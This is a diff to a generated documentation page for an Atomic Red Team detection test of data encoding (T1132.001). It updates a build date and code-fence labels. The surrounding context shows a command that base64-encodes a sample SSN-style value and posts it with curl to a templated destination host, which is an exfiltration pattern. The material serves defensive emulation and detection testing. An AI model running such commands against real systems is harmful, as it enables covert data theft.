@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1132.001"
 attack_technique_name: "Data Encoding: Standard Encoding"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "2d97c626-7652-449e-a986-b02d9051c298"
@@ -57,13 +57,13 @@ Requires curl
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ -x "$(command -v curl)" ]; then exit 0; else exit 1; fi;
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 pkg install -y curl
 ```
 
@@ -73,7 +73,7 @@ pkg install -y curl
 
 ### Command
 
-```sh
+```bash
 echo -n 111-11-1111 | b64encode -r -
 curl -XPOST #{base64_data}.#{destination_url}
 ```
